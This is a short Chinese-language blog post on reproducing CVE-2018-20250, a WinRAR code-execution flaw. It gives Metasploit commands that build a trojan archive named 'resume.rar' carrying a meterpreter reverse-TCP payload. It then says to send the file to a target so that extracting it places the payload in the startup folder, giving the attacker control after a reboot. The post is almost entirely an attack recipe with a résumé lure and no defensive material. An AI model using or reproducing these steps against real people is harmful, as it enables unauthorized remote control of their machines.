---
title: CVE-2018-20250(WinRAR代码执行)漏洞复现
tags: 
- CVE
- 漏洞
categories:
- 技术分享
top_img: https://images.pexels.com/photos/1089440/pexels-photo-1089440.jpeg?auto=compress&cs=tinysrgb&dpr=1&w=500
cover: https://images.pexels.com/photos/1089440/pexels-photo-1089440.jpeg?auto=compress&cs=tinysrgb&dpr=1&w=800
date: 2020-03-26 22:09:00
---

# 生成winrar木马
```
use exploit/windows/fileformat/winrar_ace

SET FILENAME resume.rar  # 木马文件名称
SET FILE_LIST /home/files.txt # 其他压缩文件目录文件
set PAYLOAD [PAYLOAD]. windows/meterpreter/reverse_tcp by default.  # 设置payload, 默认是windows/meterpreter/reverse_tcp

# 设置payload参数
... 

exploit # 生成木马文件在~/.msf4/local/目录下面.
```

# 利用

生成的压缩文件发送给目标, 目标解压rar文件,rar文件会将payload放在启动目录里面, 目标重启机器之后即可进行控制

